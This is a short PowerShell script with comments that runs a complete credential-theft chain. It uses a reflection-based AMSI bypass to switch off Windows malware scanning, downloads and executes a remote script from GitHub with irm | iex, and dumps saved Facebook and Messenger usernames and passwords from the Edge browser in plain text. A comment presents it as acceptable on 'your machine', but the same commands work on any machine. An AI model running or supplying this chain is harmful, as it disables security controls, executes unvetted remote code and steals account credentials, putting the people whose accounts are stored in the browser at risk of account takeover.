# Temp disable AMSI if Defender blocks (common on these scripts - your machine, your call)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Load Invoke-PowerChrome directly from GitHub (no install)
irm https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/main/Invoke-PowerChrome.ps1 | iex

# Dump ONLY Facebook-related creds from Edge and print
Invoke-PowerChrome -Browser Edge -Verbose | 
    Where-Object { $_.origin_url -match 'facebook\.com|fb\.com|messenger\.com' } | 
    Select-Object origin_url, username_value, password | 
    Format-Table -AutoSize
